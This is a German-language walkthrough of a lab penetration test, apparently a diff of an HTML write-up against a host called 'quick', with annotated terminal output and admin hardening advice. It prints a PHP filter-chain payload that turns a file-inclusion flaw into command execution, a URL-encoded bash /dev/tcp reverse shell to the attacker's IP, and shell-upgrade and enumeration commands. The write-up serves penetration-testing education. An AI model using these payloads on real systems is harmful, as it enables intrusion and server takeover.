+<span class="command">200      GET     2190l    12161w   863176c http://192.168.2.208/images/joe.jpeg</span>
+<span class="command">200      GET       57l      272w     2534c http://192.168.2.208/home.php</span>
+<span class="command">200      GET      255l     1417w   103988c http://192.168.2.208/images/pexels-mike-bird-190537.jpg</span>
+<span class="command">200      GET       19l      185w     1446c http://192.168.2.208/about.php</span>
+<span class="command">302      GET        0l        0w        0c http://192.168.2.208/send_email.php => contact.php</span>
+<span class="command">200      GET       37l      116w     1395c http://192.168.2.208/contact.php</span>
+<span class="command">200      GET       88l      342w     3735c http://192.168.2.208/index.php</span>
+<span class="command">200      GET       88l      342w     3735c http://192.168.2.208/</span>
+<span class="command">200      GET      157l      983w    66146c http://192.168.2.208/images/pexels-ishan-kulshrestha-9334971.jpg</span>
+<span class="command">200      GET      134l      799w    59813c http://192.168.2.208/images/pexels-adrian-newell-6968984.jpg</span>
+<span class="command">200      GET     1795l    10935w   818584c http://192.168.2.208/images/pexels-pixabay-38570.jpg</span>
+<span class="command">200      GET       30l      132w     1502c http://192.168.2.208/cars.php</span>
+<span class="password">🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_2_208-1748728531.state ...</span>
+[###########>--------] - 4m   3510672/6175848 4m      found:16      errors:0      
+[###########>--------] - 4m   3509800/6175260 13299/s http://192.168.2.208/ 
+[####################] - 1s   6175260/6175260 10929664/s http://192.168.2.208/images/ => Directory listing (add --scan-dir-listings to scan)    
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Feroxbuster, ein weiteres Tool zur Entdeckung von Web-Verzeichnissen und -Dateien, wurde hier mit ähnlichen Zielen wie Gobuster eingesetzt.
+                - `--url`: Ziel-URL.
+                - `--wordlist`: Die zu verwendende Wortliste.
+                - `-x`: Eine Liste von Dateierweiterungen, die an jeden Eintrag der Wortliste angehängt und getestet werden sollen.
+                - `-s`: Nur Antworten mit diesen Statuscodes anzeigen (200, 301, 302).
+                - `Extract Links`: Feroxbuster versucht, Links aus den gefundenen Seiten zu extrahieren, um weitere Endpunkte zu entdecken.
+                - `Recursion Depth`: Wie tief Feroxbuster Verzeichnisse rekursiv scannen soll.
+
+                Die Ergebnisse von Feroxbuster sind weitgehend konsistent mit denen von Gobuster:
+                - Es findet die gleichen PHP-Dateien (`index.php`, `home.php`, `about.php`, `contact.php`, `cars.php`).
+                - Es findet den Redirect von `/images` zu `/images/` und von `/send_email.php` zu `contact.php`.
+                - Zusätzlich findet Feroxbuster `styles.css` und mehrere Bilddateien im `/images`-Verzeichnis (`logo.png`, `jane.jpeg`, `joe.jpeg`, etc.). Dies liegt an der `-x`-Option und der "Extract Links"-Funktionalität.
+                - Am Ende wurde der Scan mit `ctrl+c` abgebrochen, aber es wurden bereits 16 relevante Einträge gefunden.
+                - Feroxbuster bestätigt auch das Directory Listing für `/images/`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Feroxbuster bestätigt und ergänzt die Ergebnisse von Gobuster. Das Auffinden von CSS- und Bilddateien ist normal und liefert keine direkten Schwachstellen, vervollständigt aber das Bild der Webanwendungsstruktur. Die Bestätigung des Directory Listing für `/images/` ist ebenfalls konsistent mit den Nikto-Funden. Der frühzeitige Abbruch des Scans könnte bedeuten, dass nicht alle potenziellen Pfade geprüft wurden, aber die wichtigsten Seiten wurden bereits von Gobuster und Feroxbuster identifiziert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Die Ergebnisse von Feroxbuster ändern die aktuelle Strategie nicht wesentlich, da der Fokus weiterhin auf der Ausnutzung der LFI/RFI-Schwachstelle in `index.php?page=` liegt. Die zusätzlichen gefundenen Bilddateien könnten auf Metadaten oder versteckte Informationen untersucht werden (Exiftool), dies hat aber geringere Priorität.
+                <br>
+                **Empfehlung (Admin):**
+                Die Empfehlungen ähneln denen von Gobuster:
+                - Stellen Sie sicher, dass Directory Indexing global deaktiviert ist.
+                - Entfernen oder beschränken Sie den Zugriff auf nicht benötigte Dateien.
+                - Die Tatsache, dass zwei verschiedene Tools ähnliche Ergebnisse liefern, unterstreicht die Notwendigkeit, die exponierten Endpunkte zu überprüfen und abzusichern.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">./php_filter_chain_generator.py --chain '<?php system($ _GET["cmd"]); ?>'</span></div>
+                    <pre>
+
+<span class="command">view-source:http://192.168.2.208/index.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.CSHPROMAN8|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.iconv.CSISO2022KR.UTF16BE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.CSISO159JIS|convert.iconv.CP932.ISO2022JP|convert.base64-decode/resource=php://temp&cmd=id</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Hier wird ein spezialisiertes Tool namens `php_filter_chain_generator.py` verwendet. Dieses Skript generiert komplexe PHP-Filterketten. Solche Ketten können dazu dienen, Web Application Firewalls (WAFs) zu umgehen oder Zeichenbeschränkungen bei der Ausnutzung von PHP-LFI/RFI-Schwachstellen zu überwinden, um letztendlich PHP-Code auszuführen.
+                - `--chain '<?php system($ _GET["cmd"]); ?>'`: Das Ziel ist es, diesen PHP-Code (`system($ _GET["cmd"])`) auf dem Server auszuführen. Dieser Code würde es ermöglichen, beliebige Systembefehle über einen URL-Parameter `cmd` auszuführen.
+
+                Das Skript generiert eine lange URL. Die Struktur dieser URL ist:
+                `http://192.168.2.208/index.php?page=php://filter/.../resource=php://temp&cmd=id`
+                - `page=php://filter/.../resource=php://temp`: Dies ist der entscheidende Teil für die LFI/RFI. Es nutzt PHP-Filter (`php://filter`), um eine Reihe von Zeichenkonvertierungen (`convert.iconv.*`) und schließlich eine `convert.base64-decode`-Operation durchzuführen. Der `resource=php://temp` (oder manchmal `php://input` oder eine temporäre Datei) wird oft in solchen Chains verwendet, um den Payload zu verarbeiten.
+                - Die lange Kette von `convert.iconv.*` dient oft dazu, bestimmte Zeichen zu erzeugen oder zu verschleiern, die sonst blockiert würden. In diesem Fall soll die Zeichenkette `'<?php system($ _GET["cmd"]); ?>'` effektiv auf dem Server erzeugt und ausgeführt werden.
+                - `&cmd=id`: Dies ist der Befehl, der durch die `system()`-Funktion ausgeführt werden soll, sobald die Filterkette den PHP-Code erfolgreich "geschrieben" und ausgeführt hat.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist ein fortgeschrittener Versuch, die LFI-Schwachstelle (die durch `page=../../../../etc/passwd` bestätigt wurde) zu einer Remote Code Execution (RCE) zu eskalieren. Wenn diese Filterkette funktioniert, kann der Angreifer beliebige Befehle auf dem Server ausführen, was eine vollständige Kompromittierung des Webservers bedeutet. Die Verwendung von `php://filter` ist eine bekannte Technik, um RCE über LFI zu erreichen, wenn `allow_url_include` deaktiviert ist, aber `php://filter` noch verarbeitet wird. Die Komplexität der Kette deutet darauf hin, dass möglicherweise einfache Payloads nicht funktioniert haben oder ein WAF umgangen werden soll.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Führen Sie die generierte URL in einem Browser (oder mit `curl`) aus. Die `view-source:` am Anfang der Ausgabe des Tools ist ein Hinweis darauf, dass man sich den Quelltext der Antwort ansehen sollte, da der Output des `id`-Befehls dort erscheinen könnte (oder die Seite bricht mit einem Fehler ab, wenn es nicht funktioniert).
+                - Wenn `cmd=id` funktioniert, versuchen Sie weitere Befehle, um Informationen zu sammeln (`whoami`, `ls`, `cat /etc/shadow` etc.) und eine Reverse Shell zu etablieren.
+                <br>
+                **Empfehlung (Admin):**
+                - Die Tatsache, dass solche komplexen Filterketten überhaupt eine Chance auf Erfolg haben, unterstreicht die Kritikalität der LFI-Schwachstelle. Die primäre Maßnahme ist die Behebung der LFI im `page`-Parameter von `index.php` (siehe vorherige Empfehlungen: Input-Validierung, Whitelisting).
+                - Härten Sie die PHP-Konfiguration: Deaktivieren Sie gefährliche Funktionen über `disable_functions` in `php.ini`, wenn sie nicht zwingend benötigt werden (obwohl `system` oft für legitime Zwecke gebraucht wird, ist sein Missbrauch hier das Problem).
+                - Implementieren Sie eine Web Application Firewall (WAF), die solche komplexen Filterketten und andere Angriffsversuche erkennen und blockieren kann.
+                - Überwachen Sie Webserver-Logs auf verdächtige URL-Muster, die `php://filter` oder andere Wrapper enthalten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Diese Ausgabe ist das direkte Ergebnis der Ausführung der zuvor mit `php_filter_chain_generator.py` generierten URL. Die URL enthielt `&cmd=id`. Der Befehl `id` wurde erfolgreich auf dem Server ausgeführt, und seine Ausgabe wird hier angezeigt.
+                - `uid=33(www-data)`: Die User-ID ist 33, was dem Benutzer `www-data` entspricht.
+                - `gid=33(www-data)`: Die Group-ID ist 33, was der Gruppe `www-data` entspricht.
+                - `groups=33(www-data)`: Der Benutzer ist Mitglied der Gruppe `www-data`.
+                Dies bedeutet, dass der Webserver-Prozess (Apache) unter dem Benutzer `www-data` läuft und wir nun Befehle als dieser Benutzer ausführen können.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Fantastisch! Die Remote Code Execution war erfolgreich! Dies ist ein kritischer Durchbruch. Wir haben nun die Kontrolle über den Webserver-Prozess und können Befehle im Kontext des `www-data`-Benutzers ausführen. Dies ist der erste Schritt zum vollständigen Initial Access auf Systemebene. Die Rechte des `www-data`-Benutzers sind zwar typischerweise eingeschränkt, aber dies bietet eine Basis für weitere Enumeration und Privilege Escalation.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - **Stabilisieren Sie den Zugriff:** Versuchen Sie, eine interaktive Shell zu bekommen (Reverse Shell oder Bind Shell), anstatt Befehle einzeln über die URL auszuführen. Dies erleichtert die weitere Arbeit erheblich.
+                - Führen Sie grundlegende Enumerationsbefehle als `www-data` aus: `uname -a` (Kernel-Version), `ls -la /home`, `cat /etc/passwd`, `ps aux` (laufende Prozesse), `netstat -tulnp` (Netzwerkverbindungen).
+                - Suchen Sie nach Möglichkeiten zur Privilege Escalation zum Root-Benutzer.
+                <br>
+                **Empfehlung (Admin):**
+                - **Sofortmaßnahmen:** Stoppen Sie den Webserver, um weitere Kompromittierungen zu verhindern, bis die LFI/RCE-Schwachstelle behoben ist.
+                - **Forensik:** Analysieren Sie die Webserver-Logs, um den genauen Zeitpunkt und Umfang des Angriffs zu bestimmen. Sichern Sie relevante Systemdateien für eine spätere Untersuchung.
+                - **Behebung:** Wie bereits mehrfach erwähnt, beheben Sie die LFI/RCE-Schwachstelle in `index.php` durch korrekte Eingabevalidierung und -sanitisierung.
+                - **Härtung:** Überprüfen und härten Sie die gesamte Systemkonfiguration, insbesondere PHP und Apache. Implementieren Sie eine WAF.
+            </p>
+        </section>
+            <!-- Teil 3 Anfang -->
+        <section id="proof-of-concept">
+            <h2 id="proof-of-concept-shell">Proof of Concept: Shell als www-data</h2>
+            <p class="comment">
+                Nachdem wir über die LFI-Schwachstelle und die PHP-Filterkette erfolgreich Remote Code Execution (RCE) als Benutzer `www-data` erlangt haben, ist der nächste logische Schritt, eine stabilere und interaktive Zugriffsmöglichkeit zu etablieren. Eine Reverse Shell ist hierfür ideal, da sie es uns ermöglicht, direkt Befehle auf dem Zielsystem einzugeben, als wären wir lokal angemeldet.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Auf meinem Kali-Linux-System (Angreifer-Maschine) starte ich einen Netcat-Listener auf Port `4444`.
+                - `nc`: Netcat, ein vielseitiges Netzwerktool.
+                - `-l`: Listen-Modus, wartet auf eingehende Verbindungen.
+                - `-v`: Verbose-Modus, gibt mehr Informationen aus.
+                - `-n`: Numerischer Modus, keine DNS-Auflösung.
+                - `-p 4444`: Lauscht auf Port 4444.
+                Dieser Listener wird die eingehende Verbindung von der Reverse Shell des Zielsystems empfangen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Das Einrichten des Listeners ist ein vorbereitender Schritt und entscheidend für den Erfolg der Reverse Shell. Der Listener ist nun bereit, die Verbindung vom kompromittierten Server entgegenzunehmen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Stellen Sie sicher, dass die Firewall auf der Angreifer-Maschine eingehende Verbindungen auf Port 4444 zulässt. Bereiten Sie den Reverse-Shell-Payload vor, der auf dem Zielsystem über die RCE-Schwachstelle ausgeführt werden soll.
+                <br>
+                **Empfehlung (Admin):**
+                Netzwerk-Monitoring (Egress-Filtering) kann ausgehende Verbindungen zu ungewöhnlichen Ports blockieren oder zumindest protokollieren. Dies kann das Etablieren von Reverse Shells erschweren. Intrusion Detection/Prevention Systeme (IDS/IPS) können verdächtige Shell-Payloads erkennen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+payload: <span class="command">%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Dies ist der URL-encodierte Payload für die Bash-Reverse-Shell. Dekodiert lautet der Befehl:
+                `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'`
+                - `/bin/bash -c '...'`: Führt den Befehl in der einfachen Anführungszeichen als Bash-Skript aus.
+                - `bash -i`: Startet eine interaktive Bash-Shell.
+                - `>& /dev/tcp/192.168.2.199/4444`: Leitet sowohl Standardausgabe (stdout) als auch Standardfehlerausgabe (stderr) an eine TCP-Verbindung zur IP-Adresse `192.168.2.199` (meine Angreifer-Maschine) auf Port `4444` um.
+                - `0>&1`: Leitet die Standardeingabe (stdin) ebenfalls von dieser TCP-Verbindung um, wodurch eine Zwei-Wege-Kommunikation ermöglicht wird.
+                Der Payload ist URL-encodiert, damit er korrekt als Wert für den `cmd`-Parameter in der URL übergeben werden kann.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist ein klassischer und effektiver Payload für eine Bash-Reverse-Shell. Er ist relativ kompakt und nutzt Bash-spezifische Features (`/dev/tcp`), um eine Netzwerkverbindung ohne zusätzliche Tools wie Netcat auf dem Zielsystem aufzubauen. Die IP-Adresse und der Port müssen natürlich an die Angreifer-Maschine und den dort laufenden Listener angepasst werden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Fügen Sie diesen URL-encodierten Payload in die zuvor verwendete PHP-Filterketten-URL ein, z.B.:
+                `http://192.168.2.208/index.php?page=php://filter/.../resource=php://temp&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27`
+                Stellen Sie sicher, dass der Netcat-Listener auf der Angreifer-Maschine läuft, bevor Sie diese URL aufrufen.
+                <br>
+                **Empfehlung (Admin):**
+                Systemhärtung kann das Ausführen solcher Payloads erschweren. Wenn `/dev/tcp` nicht verfügbar ist (z.B. in stark minimierten Umgebungen oder wenn Bash ohne die entsprechende Option kompiliert wurde), schlägt dieser spezielle Payload fehl. Firewalls (Egress-Filter) und IDS/IPS sind hier ebenfalls relevante Verteidigungsmaßnahmen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.208] 37902</span>
+bash: cannot set terminal process group (775): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">www-data@quick:/var/www/html$</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Die Ausgabe zeigt, dass die Reverse Shell erfolgreich war!
+                - Der Netcat-Listener auf meiner Angreifer-Maschine (`192.168.2.199`) meldet eine eingehende Verbindung vom Zielsystem (`192.168.2.208` auf einem zufälligen Quellport `37902`).
+                - Die Meldungen `bash: cannot set terminal process group ...` und `bash: no job control in this shell` sind typisch für einfache Reverse Shells, da keine vollwertige PTY (Pseudo-Terminal) zugewiesen wurde. Dies schränkt einige Funktionen wie Job-Kontrolle (z.B. `Ctrl+C` zum Abbrechen von Befehlen ohne Beenden der Shell) oder die Verwendung von Vollbild-Editoren ein.
+                - Entscheidend ist der Prompt `www-data@quick:/var/www/html$`. Dies ist der Shell-Prompt des Zielsystems, und ich kann nun direkt Befehle als Benutzer `www-data` im Verzeichnis `/var/www/html` ausführen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Fantastisch, der Zugriff auf das System als `www-data` über eine interaktive Shell ist geglückt! Dies ist ein signifikanter Fortschritt gegenüber der einzelnen Befehlsausführung über die URL. Trotz der kleinen Einschränkungen (keine PTY) ist dies eine solide Basis für die weitere Enumeration und Privilege Escalation. Unser Ziel, einen ersten stabilen Zugriff zu erlangen, wurde erreicht.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - **PTY-Upgrade:** Versuchen Sie, die Shell zu einer voll funktionsfähigen PTY aufzuwerten, um die Benutzerfreundlichkeit zu verbessern. Gängige Methoden sind:
+                  `python -c 'import pty; pty.spawn("/bin/bash")'` oder `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+                  `script /dev/null -c bash`
+                  Nach dem Ausführen eines solchen Befehls, auf der Angreiferseite `Ctrl+Z` (um die Shell in den Hintergrund zu schicken), dann `stty raw -echo; fg` und Enter drücken.
+                - Beginnen Sie mit der systeminternen Enumeration: Suchen Sie nach SUID/GUID-Dateien, Kernel-Exploits, falsch konfigurierten Diensten, Passwörtern in Konfigurationsdateien oder Skripten, Cronjobs etc.
+                <br>
+                **Empfehlung (Admin):**
+                Wenn eine solche Shell-Verbindung entdeckt wird (z.B. durch Netzwerk-Monitoring oder Host-basierte IDS):
+                - Isolieren Sie das betroffene System sofort vom Netzwerk.
+                - Identifizieren und beenden Sie den bösartigen Prozess.
+                - Beginnen Sie mit der Forensik, um den Angriffsvektor (hier die LFI/RCE) zu identifizieren und zu schließen.
+                - Überprüfen Sie das System auf Persistenzmechanismen, die der Angreifer möglicherweise eingerichtet hat.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">
+                Nachdem wir eine Shell als `www-data` auf dem Zielsystem `quick` erlangt haben, ist das nächste Ziel, unsere Privilegien zu erhöhen, idealerweise auf Root-Rechte. Wir beginnen mit grundlegender Enumeration aus der Perspektive des `www-data`-Benutzers.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">ls /home/</span></div>
+                    <pre>
+<span class="command">andrew</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `ls /home/` listet die Benutzerverzeichnisse im `/home`-Verzeichnis auf. Es gibt ein Verzeichnis namens `andrew`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies zeigt uns, dass es mindestens einen regulären Benutzer namens `andrew` auf dem System gibt. Das ist eine nützliche Information, da Benutzerdateien oder Konfigurationen im Home-Verzeichnis von `andrew` möglicherweise für die Privilegienerweiterung relevant sein könnten, falls wir Zugriff darauf erlangen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Versuchen Sie, auf das Verzeichnis `/home/andrew` zuzugreifen und dessen Inhalt aufzulisten (`ls -la /home/andrew`). Oft sind die Berechtigungen so gesetzt, dass andere Benutzer keinen Lesezugriff haben, aber es ist einen Versuch wert. Suchen Sie nach Hinweisen auf Passwörter oder SSH-Schlüssel.
+                <br>
+                **Empfehlung (Admin):**
+                Stellen Sie sicher, dass die Berechtigungen für Home-Verzeichnisse restriktiv gesetzt sind (typischerweise `drwx------` oder `700`), sodass nur der jeweilige Benutzer und Root darauf zugreifen können.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">sudo -l</span></div>
+                    <pre>
+<span class="password">[sudo] password for www-data:</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `sudo -l` wird verwendet, um aufzulisten, welche Befehle der aktuelle Benutzer (`www-data`) mit `sudo` (also potenziell mit Root-Rechten) ausführen darf. Das System fragt nach dem Passwort für `www-data`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Da wir das Passwort für `www-data` nicht kennen (und Webserver-Benutzer oft so konfiguriert sind, dass sie kein valides Login-Passwort haben oder `sudo` nicht ohne Passwort verwenden dürfen), können wir hier nicht direkt fortfahren. Die Tatsache, dass eine Passwortabfrage kommt, bedeutet aber nicht zwingend, dass `www-data` keine `sudo`-Rechte hat; es könnte sein, dass bestimmte Befehle ohne Passwort erlaubt sind (NOPASSWD-Einträge), aber der `sudo -l`-Befehl selbst das Passwort erfordert, wenn keine NOPASSWD-Regel für `sudo -l` existiert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Obwohl wir das Passwort nicht haben, ist es gut zu wissen, dass `sudo` installiert ist. Setzen Sie die Enumeration mit anderen Methoden fort (SUID-Binaries, Kernel-Exploits, Cronjobs, etc.). Wenn später ein Passwort für `www-data` gefunden wird oder eine Fehlkonfiguration in `sudoers` ausgenutzt werden kann, kann `sudo` wieder relevant werden.
+                <br>
+                **Empfehlung (Admin):**
+                Konfigurieren Sie `sudo` nach dem Prinzip der geringsten Rechte. Der `www-data`-Benutzer sollte idealerweise keine `sudo`-Rechte haben, es sei denn, es ist absolut notwendig für eine spezifische, eng definierte Aufgabe und dann möglichst mit `NOPASSWD` und sehr spezifischen Befehlen. Die Standardkonfiguration, dass `sudo -l` ein Passwort erfordert, ist sicher.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">ls /home/</span></div>
+                    <pre>
+<span class="command">andrew</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Dieser Befehl `ls /home/` wurde bereits zuvor ausgeführt und liefert das gleiche Ergebnis: das Benutzerverzeichnis `andrew`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Wiederholung dieses Befehls liefert keine neuen Informationen. Es könnte sein, dass ich im Zuge der Enumeration verschiedene Verzeichnisse prüfe und hier versehentlich denselben Befehl erneut abgesetzt habe.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Fahren Sie mit der systematischen Enumeration fort. Vermeiden Sie redundante Befehle, um den Prozess effizient zu gestalten, obwohl eine doppelte Überprüfung manchmal versehentlich passieren kann.
+                <br>
+                **Empfehlung (Admin):**
+                Keine spezifische Empfehlung basierend auf diesem wiederholten Befehl, außer der allgemeinen Überwachung von Benutzeraktivitäten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">ls -la /etc/passwd</span></div>
+                    <pre>
+<span class="command">-rw-r--r-- 1 root root 1910 Dec 16  2023 /etc/passwd</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `ls -la /etc/passwd` zeigt die Berechtigungen, Besitzer, Größe und das Änderungsdatum der Datei `/etc/passwd`.
+                - `-rw-r--r--`: Die Datei ist für den Besitzer (`root`) les- und schreibbar, für die Gruppe (`root`) und andere Benutzer (einschließlich `www-data`) nur lesbar.
+                - `1 root root`: Besitzer ist `root`, Gruppe ist `root`.
+                - `1910`: Dateigröße in Bytes.
+                - `Dec 16 2023`: Datum der letzten Änderung.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Berechtigungen sind Standard für `/etc/passwd`. Als `www-data` können wir diese Datei lesen, was normal und erwartet ist. Der Inhalt von `/etc/passwd` listet alle Benutzerkonten auf dem System auf und kann für die weitere Enumeration von Benutzernamen nützlich sein.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Lesen Sie den Inhalt von `/etc/passwd` (`cat /etc/passwd`), um eine vollständige Liste der Systembenutzer zu erhalten. Dies kann helfen, weitere potenzielle Ziele für Angriffe oder Privilege Escalation zu identifizieren.
+                <br>
+                **Empfehlung (Admin):**
+                Die Berechtigungen sind korrekt. Es gibt keine direkte Maßnahme hier, da das Lesen von `/etc/passwd` für viele Systemprozesse notwendig ist.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">ls -la /etc/shadow</span></div>
+                    <pre>
+<span class="command">-rw-r----- 1 root shadow 1088 Dec 16  2023 /etc/shadow</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `ls -la /etc/shadow` zeigt die Details der Datei `/etc/shadow`, die die gehashten Passwörter der Benutzer enthält.
+                - `-rw-r-----`: Die Datei ist für den Besitzer (`root`) les- und schreibbar, für Mitglieder der Gruppe `shadow` lesbar, aber für andere Benutzer (wie `www-data`, der typischerweise nicht in der `shadow`-Gruppe ist) nicht lesbar.
+                - `1 root shadow`: Besitzer ist `root`, Gruppe ist `shadow`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Berechtigungen für `/etc/shadow` sind korrekt und sicher konfiguriert. Als `www-data` haben wir keinen Lesezugriff auf diese Datei, was das direkte Auslesen von Passwort-Hashes verhindert. Dies ist eine wichtige Sicherheitsmaßnahme.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Da kein direkter Lesezugriff möglich ist, müssen andere Wege zur Privilegienerweiterung gefunden werden, um möglicherweise Root-Rechte zu erlangen und dann `/etc/shadow` lesen zu können (z.B. für Offline-Passwort-Cracking).
+                <br>
+                **Empfehlung (Admin):**
+                Die Berechtigungen sind korrekt. Stellen Sie sicher, dass keine unnötigen Benutzer Mitglied der `shadow`-Gruppe sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">ls -la /opt/</span></div>
+                    <pre>
+total 8
+drwxr-xr-x  2 root root 4096 Mar 14  2023 .
+drwxr-xr-x 20 root root 4096 Dec 16  2023 ..
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `ls -la /opt/` listet den Inhalt des Verzeichnisses `/opt` auf. Dieses Verzeichnis wird oft für die Installation optionaler Softwarepakete von Drittanbietern verwendet. Die Ausgabe zeigt nur die Standardeinträge `.` (aktuelles Verzeichnis) und `..` (Elternverzeichnis).
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Das `/opt`-Verzeichnis scheint leer zu sein oder enthält keine für `www-data` sichtbaren oder relevanten Dateien/Verzeichnisse für eine direkte Privilegienerweiterung.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Überprüfen Sie andere Standardverzeichnisse, in denen möglicherweise interessante Software oder Konfigurationen abgelegt sind (z.B. `/usr/local/`, `/srv/`).
+                <br>
+                **Empfehlung (Admin):**
+                Wenn Software in `/opt` installiert wird, stellen Sie sicher, dass sie mit den korrekten Berechtigungen versehen ist und regelmäßig aktualisiert wird.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">ls -la /var/mail/</span></div>
+                    <pre>
+total 8
+drwxrwsr-x  2 root mail 4096 Mar 14  2023 .
+drwxr-xr-x 14 root root 4096 Dec 16  2023 ..
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                `ls -la /var/mail/` listet den Inhalt des Verzeichnisses auf, in dem eingehende E-Mails für lokale Benutzer gespeichert werden. Das `s`-Bit (SGID) im Gruppenrecht (`rws`) für das Verzeichnis `.` bedeutet, dass neu erstellte Dateien in diesem Verzeichnis die Gruppen-ID des Verzeichnisses (`mail`) erben.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Das Verzeichnis `/var/mail/` enthält keine direkt sichtbaren Maildateien für `www-data` oder andere interessante Dateien. Die Berechtigungen sind typisch für ein Mail-Spool-Verzeichnis.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Es ist unwahrscheinlich, dass hier direkt ein Weg zur Privilegienerweiterung gefunden wird, es sei denn, es gäbe lesbare Maildateien mit sensiblen Informationen. Dies scheint hier nicht der Fall zu sein.
+                <br>
+                **Empfehlung (Admin):**
+                Stellen Sie sicher, dass die Berechtigungen für Mail-Dateien (falls vorhanden) korrekt sind (typischerweise nur für den jeweiligen Benutzer lesbar).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@quick:/var/www/html$ <span class="command">ls -la /var/backups/</span></div>
+                    <pre>
+total 8
+drwxr-xr-x  2 root root 4096 Apr 15  2020 .
+drwxr-xr-x 14 root root 4096 Dec 16  2023 ..
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
